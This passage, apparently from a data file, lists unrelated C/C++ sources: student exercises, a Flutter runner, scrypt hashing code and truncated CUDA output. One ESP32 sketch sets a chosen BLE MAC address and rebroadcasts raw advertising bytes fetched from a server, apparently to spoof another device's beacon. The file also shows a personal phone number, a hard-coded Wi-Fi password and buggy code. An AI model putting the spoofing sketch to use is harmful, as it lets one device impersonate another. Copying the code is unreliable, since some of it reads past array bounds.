0;\n}\n\nint uloha_2_5_1() {\n    HANDLE  hConsole;\n    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    for (int i = 0; i <= 100; i++) {\n        if (i <= 10) {\n            SetConsoleTextAttribute(hConsole, 10);\n        }\n        else if (i <= 22) {\n            SetConsoleTextAttribute(hConsole, 4);\n        }\n        else if (i <= 35) {\n            SetConsoleTextAttribute(hConsole, 1);\n        }\n        else if (i <= 50) {\n            SetConsoleTextAttribute(hConsole, 5);\n        }\n        else if (i <= 100) {\n            SetConsoleTextAttribute(hConsole, 3);\n        }\n        Sleep(100);\n        printf(\"%.3d\\n\", i);\n    }\n    return 0;\n}\n\nint LinePrinf(char text[], char info[], int length) {\n    HANDLE  hConsole;\n    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n\n    int k = 0;\n\n    printf(\"%c\", 179);\n    SetConsoleTextAttribute(hConsole, 10);\n    printf(\"%s\", text);\n    SetConsoleTextAttribute(hConsole, 6);\n    printf(\"%c \", 179);\n    for (int j = 0; j < length; j++) {\n        if (length - j <= strlen(info)) {\n            SetConsoleTextAttribute(hConsole, 10);\n            printf(\"%c\", info[k]);\n            k++;\n        }\n        else {\n            printf(\" \");\n        }\n    }\n    SetConsoleTextAttribute(hConsole, 6);\n    printf(\" %c\", 179);\n    return 0;\n}\n\nint uloha_2_5_2() {\n    HANDLE  hConsole;\n    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n\n    COORD point = { 50, 10 };\n    char meno[] = \"Roman Rudenko\";\n    char vyska[] = \"180cm\";\n    char hmotnost[] = \"80kg\";\n    char tel[] = \"0968856930\";\n\n    int length = strlen(meno);\n    length = (length >= strlen(vyska)) ? length : strlen(vyska);\n    length = (length >= strlen(hmotnost)) ? leng",
    "///Queue threw LinkedList\n#include <iostream>\n#include <ctime>\n#include <cstdlib>\n#include <vector>\n\nusing namespace std;\n\nstruct LinkedQue {  //Structure of data jednosmerneho sezn\n    int data = NULL;\n    LinkedQue *next = nullptr;\n};\n\nstruct Switcher { //Struct of Switcher\n    LinkedQue* begin;\n    LinkedQue* end;\n};\n\nvector <int> CreateArray(){ //Creating a random massive\n    srand (static_cast <unsigned int>(time(0)));\n    vector <int> array(rand() % 100);\n    for (int i = 0; i <= array.size(); i++)\n        array[i] = rand() % 100;\n    return array;\n}\n\nstring IsEmpty(Switcher point){ //We use this func in next funct, cuz its here\n    if (point.begin == point.end && point.begin->data == NULL)\n        return \"YES\\n\";\n    return \"NO\\n\";\n}\n\nSwitcher CreateEmptQ(){ //Create an empty queue\n    Switcher que;\n    LinkedQue *zacatek = new LinkedQue;\n    LinkedQue *konec = zacatek; //Beginning of queue\n    que.begin = zacatek;\n    que.end = konec;\n    return que;\n}\n\nvoid Enqueue(Switcher &point, int x){\n    if (IsEmpty(point) == \"YES\\n\")\n        point.begin->data = x;\n    else {\n        point.end->next = new LinkedQue;\n        point.end = point.end->next;\n        point.end->data = x;\n    }\n}\n\nSwitcher CreateLinQue(vector<int>array) { //Creating a Linked Queue\n    Switcher que;\n    LinkedQue *zacatek = new LinkedQue;\n    LinkedQue *konec = zacatek; //Beginning of queue\n    que.begin = zacatek;\n    for (int i = 0; i < array.size() - 1; i++){ // -1 cuz we always creating a NEW list//ENQUEUE\n        konec->data = array[i]; //Konec se stava zacatkem\n        konec->next = new LinkedQue;\n        konec = konec->next;\n    }\n    konec->data = array[array.size() - 1]; //konec = last element\n    que.end = konec;\n    return que;\n}\n\nint Dequeue(Switcher &point){ //DEQUEUE\n    int tmp = point.begin->data;\n    if (point.begin == point.end)\n        point.begin->data = NULL;\n    else\n        point.begin = point.begin->next;\n    return tmp;\n}\n\nint Front(Switcher point){\n    return point.begin->data;\n}\n\nvoid Vypis(Switcher point){\n    LinkedQue* head = point.begin;\n    while (head != nullptr) {\n        cout << head->data << \" \";\n        head = head->next;\n    }\n}\n\n\nint main() {\n    vector<int>array = CreateArray();\n    Switcher head = CreateLinQue(array);\n    cout << \"Seznam cisel: \";\n    Vypis(head);\n    cout << \"\\nF-ce DEQUEUE: \";\n    cout << \"\\nDELETED ELEMENT: \" << Dequeue(head) << \"\\n\";\n    Vypis(head);\n    cout << \"\\nF-ce FRONT: \";\n    cout << \"\\n\" << Front(head);\n    cout << \"\\nIs queue EMPTY?\\n\";\n    cout << IsEmpty(head);\n    int x;\n    cout << \"Ready to push new QUEUE:)\";\n    Switcher head2 = CreateEmptQ();\n    cout << \"\\nEnter a NUM: \\n\";\n    cin >> x;\n    for (int i = 0; i < x; i++)\n        Enqueue(head2,rand() % 10 + 1);\n    cout << \"\\nYour queue: \";\n    Vypis(head2);\n    return 0;\n}",
    "#include <iostream>\r\n#include <string>\r\nusing namespace std;\r\n\r\nclass Avion {\r\nprivate:\r\n    string modelo;\r\n    int combustible;\r\n    int consumo_combustible;\r\n\r\npublic:\r\n    Avion(string modelo, int combustible, int consumo_combustible) {\r\n        this->modelo = modelo;\r\n        this->combustible = combustible;\r\n        this->consumo_combustible = consumo_combustible;\r\n    }\r\n\r\n    bool capacidad_de_vuelo_combustible(int tiempo_de_vuelo) {\r\n        int combustible_necesario = tiempo_de_vuelo * consumo_combustible;\r\n        return combustible_necesario <= combustible;\r\n    }\r\n\r\n    string getModelo() {\r\n        return modelo;\r\n    }\r\n\r\n    int getCombustible() {\r\n        return combustible;\r\n    }\r\n\r\n    int getConsumoCombustible() {\r\n        return consumo_combustible;\r\n    }\r\n};\r\n\r\nclass Mision {\r\nprivate:\r\n    string destino;\r\n    int duracion;\r\n    int tripulacion;\r\n\r\npublic:\r\n    Mision(string destino, int duracion, int tripulacion) {\r\n        this->destino = destino;\r\n        this->duracion = duracion;\r\n        this->tripulacion = tripulacion;\r\n    }\r\n\r\n    void planificar_mision(Avion avion) {\r\n        cout << \"Combustible m\u00ednimo requerido: \" << (duracion * avion.getConsumoCombustible()) << endl;\r\n        if (avion.capacidad_de_vuelo_combustible(duracion)) {\r\n            cout << \"Planificaci\u00f3n de Misi\u00f3n exitosa\" << endl;\r\n            cout << \"Cantidad de combustible en el tanque: \" << avion.getCombustible() << endl;\r\n        } else {\r\n            cout << \"Combustible insuficiente para el tiempo de vuelo en la misi\u00f3n\" << endl;\r\n        }\r\n    }\r\n};\r\n\r\nint main() {\r\n    Avion avion(\"Airbus 777\", 2000, 500);\r\n    Mision mision(\"Lima\", 5, 100);\r\n    mision.planificar_mision(avion);\r\n    return 0;\r\n}",
    "#include <iostream> //Incluir biblioteca Input Output Stream\n#include <cstdlib>\n#include <ctime>\nusing namespace std; //\"Abreviar\" a fun\u00e7\u00e3o padr\u00e3o std::\n\n//Fun\u00e7\u00e3o principal, onde o c\u00f3digo ser\u00e1 executado\nint main () {\n    cout << \"***********************\" << endl; //endl = endline\n    cout << \"* Jogo da Adivinha\u00e7\u00e3o *\" << endl;\n    cout << \"***********************\" << endl;\n    //C + Output = cout (<<)\n    //C + Input = cin (>>)\n\n    cout << \"Voc\u00ea gostaria de jogar em qual dificuldade?\" << endl;\n    cout << \"---> (F)F\u00e1cil -- (M)M\u00e9dio -- (D)Dif\u00edcil <---\" << endl;\n\n    char dificuldade;\n    cin >> dificuldade;\n    //char \u00e9 usada para guardar uma letra\n\n    int numero_de_tentativas = 0;\n\n    switch(dificuldade){\n        case 'F':\n            numero_de_tentativas = 15;\n            break;\n        case 'M':\n            numero_de_tentativas = 10;\n            break;\n        case 'D':\n            numero_de_tentativas = 5;\n        default:\n            cout << \"Digite uma dificuldade v\u00e1lida\" << endl;\n    }\n\n    srand(time(NULL));\n\n    const int NUMERO_SECRETO = rand() % 100;\n    \n    bool nao_acertou = true;\n\n    double pontos = 1000.0;\n\n    int tentativas = 0;\n\n    for (tentativas = 1;tentativas <= numero_de_tentativas;tentativas++){\n        // O ++ refere-se a adicionar mais um ( + 1 ) a variavel\n\n        cout << \"Voc\u00ea est\u00e1 na tentativa \" << tentativas << endl;\n\n        int chute;\n\n        cout << \"Qual o seu chute? \" << endl;\n\n        cin >> chute;\n\n        cout << \"O seu chte foi: \" << chute << endl;\n\n        bool acertou = chute == NUMERO_SECRETO;\n        bool maior = chute > NUMERO_SECRETO;\n    \n        double pontos_perdidos = abs(chute - NUMERO_SECRETO)/2.0;\n                                // abs --> abrevia\u00e7\u00e3o para absolute, valor absoluto\n        pontos = pontos - pontos_perdidos;\n\n        if(acertou){\n            cout << \"Voc\u00ea acertou o n\u00famero secreto!\" << endl;\n            nao_acertou = false;\n            break;\n\n        } else if(maior){\n            cout << \"O seu chute foi maior que o n\u00famero secreto!\" << endl;\n        } else{\n            cout << \"O seu chute foi menor que o n\u00famero secreto!\" << endl;\n        }\n    }\n\n    cout << \"Fim de Jogo!\" << endl;\n\n    if(nao_acertou) {\n        cout << \"As suas tentativas acabaram e voc\u00ea perdeu!\" << endl;\n        cout << \"Tente novamente!\" << endl;\n    } else {\n        cout << \"Voc\u00ea ganhou em \" << tentativas << \" tentativas!\" << endl;\n        cout.precision(2); // seta quantas casas decimais\n        cout << fixed; // modificador fixed, para corrigir a nota\u00e7\u00e3o cient\u00edfica\n        cout << \"Sua pontua\u00e7\u00e3o foi de \" << pontos << endl;\n    }\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"first_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/*-\n * Copyright 2009 Colin Percival, 2011 ArtForz, 2011 pooler, 2013 Balthazar\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in the\n *    documentation and/or other materials provided with the distribution.\n *\n * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND\n * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE\n * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\n * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS\n * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)\n * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY\n * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF\n * SUCH DAMAGE.\n *\n * This file was originally written by Colin Percival as part of the Tarsnap\n * online backup system.\n */\n\n#include <stdlib.h>\n#include <stdint.h>\n\n#include \"scrypt.h\"\n#include \"pbkdf2.h\"\n\n#include \"util.h\"\n#include \"net.h\"\n\n#define SCRYPT_BUFFER_SIZE (131072 + 63)\n\n#if defined (OPTIMIZED_SALSA) && ( defined (__x86_64__) || defined (__i386__) || defined(__arm__) )\n    extern \"C\" void scrypt_core(unsigned int *X, unsigned int *V);\n#else\n\n//\n// Generic scrypt_core implementation\n//\nvoid bitscrypt::xor_salsa8(unsigned int B[16], const unsigned int Bx[16])\n{\n    unsigned int x00,x01,x02,x03,x04,x05,x06,x07,x08,x09,x10,x11,x12,x13,x14,x15;\n\n    x00 = (B[0] ^= Bx[0]);\n    x01 = (B[1] ^= Bx[1]);\n    x02 = (B[2] ^= Bx[2]);\n    x03 = (B[3] ^= Bx[3]);\n    x04 = (B[4] ^= Bx[4]);\n    x05 = (B[5] ^= Bx[5]);\n    x06 = (B[6] ^= Bx[6]);\n    x07 = (B[7] ^= Bx[7]);\n    x08 = (B[8] ^= Bx[8]);\n    x09 = (B[9] ^= Bx[9]);\n    x10 = (B[10] ^= Bx[10]);\n    x11 = (B[11] ^= Bx[11]);\n    x12 = (B[12] ^= Bx[12]);\n    x13 = (B[13] ^= Bx[13]);\n    x14 = (B[14] ^= Bx[14]);\n    x15 = (B[15] ^= Bx[15]);\n    for (int i = 0; i < 8; i += 2)\n    {\n#define R(a, b) (((a) << (b)) | ((a) >> (32 - (b))))\n        /* Operate on columns. */\n        x04 ^= R(x00+x12, 7); x09 ^= R(x05+x01, 7);\n        x14 ^= R(x10+x06, 7); x03 ^= R(x15+x11, 7);\n\n        x08 ^= R(x04+x00, 9); x13 ^= R(x09+x05, 9);\n        x02 ^= R(x14+x10, 9); x07 ^= R(x03+x15, 9);\n\n        x12 ^= R(x08+x04,13); x01 ^= R(x13+x09,13);\n        x06 ^= R(x02+x14,13); x11 ^= R(x07+x03,13);\n\n        x00 ^= R(x12+x08,18); x05 ^= R(x01+x13,18);\n        x10 ^= R(x06+x02,18); x15 ^= R(x11+x07,18);\n\n        /* Operate on rows. */\n        x01 ^= R(x00+x03, 7); x06 ^= R(x05+x04, 7);\n        x11 ^= R(x10+x09, 7); x12 ^= R(x15+x14, 7);\n\n        x02 ^= R(x01+x00, 9); x07 ^= R(x06+x05, 9);\n        x08 ^= R(x11+x10, 9); x13 ^= R(x12+x15, 9);\n\n        x03 ^= R(x02+x01,13); x04 ^= R(x07+x06,13);\n        x09 ^= R(x08+x11,13); x14 ^= R(x13+x12,13);\n\n        x00 ^= R(x03+x02,18); x05 ^= R(x04+x07,18);\n        x10 ^= R(x09+x08,18); x15 ^= R(x14+x13,18);\n#undef R\n    }\n\n    B[0] += x00;\n    B[1] += x01;\n    B[2] += x02;\n    B[3] += x03;\n    B[4] += x04;\n    B[5] += x05;\n    B[6] += x06;\n    B[7] += x07;\n    B[8] += x08;\n    B[9] += x09;\n    B[10] += x10;\n    B[11] += x11;\n    B[12] += x12;\n    B[13] += x13;\n    B[14] += x14;\n    B[15] += x15;\n}\n\nvoid bitscrypt::scrypt_core(unsigned int *X, unsigned int *V)\n{\n    for (unsigned int i = 0; i < 1024; ++i)\n    {\n        ::memcpy(&V[i * 32], X, 128);\n        bitscrypt::xor_salsa8(&X[0], &X[16]);\n        bitscrypt::xor_salsa8(&X[16], &X[0]);\n    }\n    for (unsigned int i = 0; i < 1024; ++i)\n    {\n        unsigned int j = 32 * (X[16] & 1023);\n        for (unsigned int k = 0; k < 32; ++k)\n        {\n            X[k] ^= V[j + k];\n        }\n        bitscrypt::xor_salsa8(&X[0], &X[16]);\n        bitscrypt::xor_salsa8(&X[16], &X[0]);\n    }\n}\n\n#endif\n\n/* cpu and memory intensive function to transform a 80 byte buffer into a 32 byte output\n   scratchpad size needs to be at least 63 + (128 * r * p) + (256 * r + 64) + (128 * r * N) bytes\n   r = 1, p = 1, N = 1024\n */\nuint256 bitscrypt::scrypt_nosalt(const void *input, size_t inputlen, void *scratchpad)\n{\n    unsigned int *V;\n    unsigned int X[32];\n    uint256 result = 0;\n    V = (unsigned int *)(((uintptr_t)(scratchpad) + 63) & ~ (uintptr_t)(63));\n\n    pbkdf2::PBKDF2_SHA256((const uint8_t *)input, inputlen, (const uint8_t *)input, inputlen, 1, (uint8_t *)X, 128);\n    scrypt_core(X, V);\n    pbkdf2::PBKDF2_SHA256((const uint8_t *)input, inputlen, (uint8_t *)X, 128,",
    "#include<iostream> \r\n#include<conio.h>\r\n#include<time.h>\r\nusing namespace std ; \r\n void guess(void){ \r\n cout<<\"**********************\"<<endl<<\"\\n\\n\";\r\n cout<<\"-------------Welcome To The Game : Guess Number -----------------\"<<endl;\r\ncout<<\"\\n\\tI have Selected One Number Between 1 to 10 Guess It \"<<endl; \r\ncout<<\"\\n\\t\\t------You have 3 Chance To Guess-------\"<<endl;\r\ncout<<\"\\n\\t\\t\\t---- All The Best ----\"<<endl; \r\ncout<<\"\\n\\n************************\"<<endl; \r\nsrand(time(0));\r\n int num = (rand ()%10)  +1;\r\n int input ;  \r\n int chance = 3 ;  \r\n for(int i = 1 ; i <= 3 ; i++){ \r\n cout<<\"Enter The Guessed Number : \"; \r\n cin>>input;\r\n cout<<\"\\n\";   \r\n      if(input==num){     \r\n      cout<<\"Congratulation :- You Have Guessed Right Number \"<<endl; \r\n      break;\r\n      }\r\n      else{ \r\n          if(input>num){ \r\n          cout<<\"OOPs Wrong Answer \"<<endl; \r\n          cout<<\"\\nHINT : To high Number Guessed :- Try Again \"<<endl;  \r\n          chance--; \r\n          cout<<\"Remaining Chance : \"<<chance<<endl<<\"\\n\\n\"; \r\n          \r\n          }\r\n          else if(input < num){ \r\n          cout<<\"OOPs Wrong Answer \"<<endl; \r\n          cout<<\"HINT : To Small number Guessed :- Try Again \"<<endl;  \r\n          chance--; \r\n          cout<<\"Remaining Chance : \"<<chance<<endl<<\"\\n\\n\"; \r\n           if(chance==0){ \r\n cout<<\"\\n\\t--------Game Over-------- \"<<endl; \r\n\r\n  }\r\n          \r\n    }\r\n      }\r\n \r\n         }\r\n } \r\nint main()\r\n{\r\n\tguess(); \r\n    return 0 ; \r\n}",
    "#include \"BLEDevice.h\"\r\n#include \"BLEUtils.h\"\r\n#include \"esp_sleep.h\"\r\n#include <WiFi.h>\r\n#include <HTTPClient.h>\r\n#include <ArduinoJson.h>\r\n#include \"LCD_Driver.h\"\r\n#include \"GUI_Paint.h\"\r\n#include \"image.h\"\r\n\r\n\r\nBLEAdvertising *pAdvertising;\r\n\r\nuint8_t bleMac[6] = {0x5C, 0xC3, 0x36, 0x8C, 0xBC, 0x7C};\r\nuint8_t bleRaw[31];\r\nboolean rawMoreThan31 = false;\r\nuint8_t bleRaw32[32]; \r\nconst char* ssid = \"\u4f60\u7684wifi\u540d\u5b57\";\r\nconst char* password = \"\u4f60\u7684wifi\u5bc6\u7801\";//\u628a\u624b\u673a\u70ed\u70b9\u8bbe\u7f6e\u6210\u5bf9\u5e94\u7684wifi\r\n\r\nvoid setup() {\r\n  Serial.begin(115200);\r\n\r\n  Config_Init();\r\n  LCD_Init();\r\n  LCD_SetBacklight(100);\r\n  Paint_NewImage(LCD_WIDTH, LCD_HEIGHT, 90, WHITE);\r\n  Paint_SetRotate(90);\r\n  LCD_Clear(BLACK);\r\n  delay(1000);\r\n\r\n\r\n  WiFi.begin(ssid, password);\r\n    while (WiFi.status() != WL_CONNECTED) {\r\n    delay(1000);\r\n    Serial.println(\"Connecting to WiFi...\");\r\n    LCD_Clear(BLACK);\r\n    Paint_DrawString_EN(20, 50, \"please set wifi name:liu password:liuxian88\", &Font20, BLACK, GREEN);\r\n  }\r\n  \r\n  LCD_Clear(BLACK);\r\n  Paint_DrawString_EN(20, 50, \"WiFi connected!\", &Font20, BLACK, GREEN);\r\n  delay(1000);\r\n}\r\n\r\n\r\nvoid loop() {\r\n\r\n  HTTPClient http;\r\n  http.begin(\"http://\u670d\u52a1\u5668ip:3000/rawData\");//\u5728\u8fd9\u586b\u5165\u670d\u52a1\u5668api\r\n  \r\n  LCD_Clear(BLACK);\r\n  Paint_DrawString_EN(20, 50, \"Sending HTTP GET...\", &Font20, BLACK, GREEN);\r\n  delay(500);\r\n  \r\n  int httpCode = http.GET();\r\n\r\n  if (httpCode > 0) {\r\n    if (httpCode == HTTP_CODE_OK) {\r\n      String payload = http.getString();\r\n      \r\n      StaticJsonDocument<200> doc;\r\n      DeserializationError error = deserializeJson(doc, payload);\r\n      LCD_Clear(BLACK);  \r\n      Paint_DrawString_EN(20, 50, \"Data received!\", &Font20, BLACK, GREEN);\r\n      delay(1000);\r\n      \r\n      if (error) {\r\n        Serial.print(F(\"deserializeJson() failed: \"));\r\n        LCD_Clear(BLACK);\r\n        Paint_DrawString_EN(20, 50, \"JSON parsing error!\", &Font20, BLACK, RED);\r\n        Serial.println(error.f_str());\r\n        return;\r\n      }\r\n      \r\n      String rawDataStr = doc[\"rawData\"];\r\n      int rawDataLen = rawDataStr.length() / 2;\r\n      \r\n      LCD_Clear(BLACK);\r\n      Paint_DrawString_EN(20, 50, \"Parsing BLE data...\", &Font20, BLACK, GREEN);\r\n      delay(500);\r\n      \r\n      for (int i = 0; i < rawDataLen; i++) {\r\n        String byteString = rawDataStr.substring(i * 2, i * 2 + 2);\r\n        if (i < 31) {\r\n          bleRaw[i] = strtol(byteString.c_str(), NULL, 16);\r\n        } else {\r\n          bleRaw32[i - 31] = strtol(byteString.c_str(), NULL, 16);\r\n        }\r\n      }\r\n      \r\n      if (rawDataLen > 31) {\r\n        rawMoreThan31 = true;\r\n      }\r\n    }\r\n  } else {\r\n    Serial.printf(\"[HTTP] GET... failed, error: %s\\n\", http.errorToString(httpCode).c_str());\r\n    LCD_Clear(BLACK);\r\n    Paint_DrawString_EN(20, 50, \"HTTP GET failed!\", &Font20, BLACK, RED);\r\n    delay(1000);\r\n  }\r\n  \r\n  http.end();\r\n\r\n  if (UNIVERSAL_MAC_ADDR_NUM == FOUR_UNIVERSAL_MAC_ADDR) {\r\n    bleMac[5] -= 2;\r\n  } else if (UNIVERSAL_MAC_ADDR_NUM == TWO_UNIVERSAL_MAC_ADDR) {\r\n    bleMac[5] -= 1;\r\n  }\r\n  esp_base_mac_addr_set(bleMac);\r\n\r\n  BLEDevice::init(\"\");\r\n\r\n  pAdvertising = BLEDevice::getAdvertising();\r\n\r\n  BLEAdvertisementData oScanResponseData = BLEAdvertisementData();\r\n  pAdvertising->setScanResponseData(oScanResponseData);\r\n\r\n  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();\r\n  pAdvertising->setAdvertisementData(oAdvertisementData);\r\n  \r\n  LCD_Clear(BLACK);\r\n  Paint_DrawString_EN(20, 50, \"Configuring BLE...\", &Font20, BLACK, GREEN);\r\n  delay(500);\r\n\r\n  esp_err_t errRc = ::esp_ble_gap_config_adv_data_raw(bleRaw, 31);\r\n  if (errRc != ESP_OK) {\r\n    Serial.printf(\"esp_ble_gap_config_adv_data_raw: %d\\n\", errRc);\r\n    LCD_Clear(BLACK);\r\n    Paint_DrawString_EN(20, 50, \"BLE config error!\", &Font20, BLACK, RED);\r\n    delay(1000);\r\n  }\r\n\r\n  if (rawMoreThan31) {\r\n    errRc = ::esp_ble_gap_config_scan_rsp_data_raw(bleRaw32, sizeof(bleRaw32)/sizeof(bleRaw32[0]));\r\n    if (errRc != ESP_OK) {\r\n      Serial.printf(\"esp_ble_gap_config_scan_rsp_data_raw: %d\\n\", errRc);\r\n    }\r\n  }\r\n\r\n  pAdvertising->start();\r\n  LCD_Clear(BLACK);\r\n  Paint_DrawString_EN(20, 50, \"BLE advertising...\", &Font20, BLACK, GREEN);\r\n  delay(1000);\r\n  \r\n  LCD_Clear(BLACK);\r\n  Paint_DrawString_EN(20, 50, \"Execution completed!\", &Font20, BLACK, GREEN);\r\n  delay(5000);\r\n  LCD_Clear(BLACK);\r\n  delay(1000);\r\n\r\n}\r\n",
    "# 1 \"CMakeCUDACompilerId.cu\"\n#pragma GCC diagnostic ignored \"-Wunused-local-typedefs\"\n# 1\n#pragma GCC diagnostic push\n# 1\n#pragma GCC diagnostic ignored \"-Wunused-variable\"\n# 1\n#pragma GCC diagnostic ignored \"-Wunused-function\"\n# 1\nstatic char __nv_inited_managed_rt = 0; static void **__nv_fatbinhandle_for_managed_rt; static void __nv_save_fatbinhandle_for_managed_rt(void **in){__nv_fatbinhandle_for_managed_rt = in;} static char __nv_init_managed_rt_with_module(void **); static inline void __nv_init_managed_rt(void) { __nv_inited_managed_rt = (__nv_inited_managed_rt ? __nv_inited_managed_rt                 : __nv_init_managed_rt_with_module(__nv_fatbinhandle_for_managed_rt));}\n# 1\n#pragma GCC diagnostic pop\n# 1\n#pragma GCC diagnostic ignored \"-Wunused-variable\"\n\n# 1\n#define __nv_is_extended_device_lambda_closure_type(X) false\n#define __nv_is_extended_host_device_lambda_closure_type(X) false\n#if defined(__nv_is_extended_device_lambda_closure_type) && defined(__nv_is_extended_host_device_lambda_closure_type)\n#endif\n\n# 1\n# 61 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/cuda_runtime.h\"\n#pragma GCC diagnostic push\n# 64\n#pragma GCC diagnostic ignored \"-Wunused-function\"\n# 66 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/device_types.h\"\n#if 0\n# 66\nenum cudaRoundMode { \n# 68\ncudaRoundNearest, \n# 69\ncudaRoundZero, \n# 70\ncudaRoundPosInf, \n# 71\ncudaRoundMinInf\n# 72\n}; \n#endif\n# 98 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 98\nstruct char1 { \n# 100\nsigned char x; \n# 101\n}; \n#endif\n# 103 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 103\nstruct uchar1 { \n# 105\nunsigned char x; \n# 106\n}; \n#endif\n# 109 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 109\nstruct __attribute((aligned(2))) char2 { \n# 111\nsigned char x, y; \n# 112\n}; \n#endif\n# 114 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 114\nstruct __attribute((aligned(2))) uchar2 { \n# 116\nunsigned char x, y; \n# 117\n}; \n#endif\n# 119 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 119\nstruct char3 { \n# 121\nsigned char x, y, z; \n# 122\n}; \n#endif\n# 124 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 124\nstruct uchar3 { \n# 126\nunsigned char x, y, z; \n# 127\n}; \n#endif\n# 129 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 129\nstruct __attribute((aligned(4))) char4 { \n# 131\nsigned char x, y, z, w; \n# 132\n}; \n#endif\n# 134 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 134\nstruct __attribute((aligned(4))) uchar4 { \n# 136\nunsigned char x, y, z, w; \n# 137\n}; \n#endif\n# 139 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 139\nstruct short1 { \n# 141\nshort x; \n# 142\n}; \n#endif\n# 144 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 144\nstruct ushort1 { \n# 146\nunsigned short x; \n# 147\n}; \n#endif\n# 149 \"/usr/local/cuda-11.3/bin/../targets/x86_64-linux/include/vector_types.h\"\n#if 0\n# 149\nstruct __attribute((aligned(4))) short2 { \n# 151\nshort x, y; \n# 152\n}; \n#endif\n# 154 